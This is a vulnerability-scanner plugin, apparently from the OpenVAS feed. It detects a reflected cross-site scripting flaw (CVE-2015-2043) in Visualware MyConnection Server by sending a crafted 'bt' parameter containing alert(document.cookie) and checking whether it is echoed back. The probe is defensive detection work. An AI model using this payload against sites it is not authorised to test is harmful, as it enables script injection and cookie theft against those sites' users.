if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805348" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-2043" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-03-06 15:09:11 +0530 (Fri, 06 Mar 2015)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "Visualware MyConnection Server Multiple XSS Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Visualware
  MyConnection Server and is prone to multiple xss vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple errors exist as input passed via
  'bt', 'variable' and 'et' GET parameter to the 'myspeed/db/historyitem'
  script is not validated before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site." );
	script_tag( name: "affected", value: "Visualware MyConnection Server 8.2b" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/130490" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", "/myspeed", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/admin" ), port: http_port );
	if(ContainsString( rcvRes, "MyConnection Server" ) && ContainsString( rcvRes, "Visualware, Inc." ) && ContainsString( rcvRes, ">Administration<" )){
		url = dir + "/db/historyitem?bt=%22%27);+alert(document.cookie);+//";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "alert\\(document\\.cookie\\)", extra_check: "MyConnection Server" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

